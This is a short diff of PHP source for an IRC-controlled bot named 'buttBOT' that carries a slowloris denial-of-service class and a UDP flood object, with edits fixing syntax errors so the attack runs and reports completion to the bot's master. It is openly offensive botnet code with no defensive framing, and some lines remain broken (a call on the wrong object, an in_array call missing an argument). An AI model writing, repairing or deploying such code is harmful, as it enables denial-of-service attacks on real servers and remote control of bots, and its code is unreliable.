@@ -60,7 +60,7 @@ class slowloris {
 	                        }else{
 	                                exit();
 	                        }
-	                        exit(0);
+	                        #exit(0);
 	                    }
 	                }
 	        }
@@ -68,7 +68,7 @@ class slowloris {
 	
 	}
 	public function checkProto($host){
-	        $comps = (parse_url($host);
+	        $comps = parse_url($host);
 	        if(in_array("http", $comps)){
 	                return "http";
 	        } elseif(in_array("https")){
@@ -261,7 +261,7 @@ class buttBOT {
 						);
 					$slowloris = new slowloris();
 					$status = $udpFlood->startSlowloris($params);
-                                	$this->send_data('PRIVMSG '.$master[1].' :', 'SLOWLORIS COMPLETE - '.strval($status);
+                                	$this->send_data('PRIVMSG '.$master[1].' :', 'SLOWLORIS COMPLETE - '.strval($status));
 				} else {
                                 $this->send_data('PRIVMSG '.$master[1].' :', 'ERROR: host port http_method threads time(s)');
 				}		
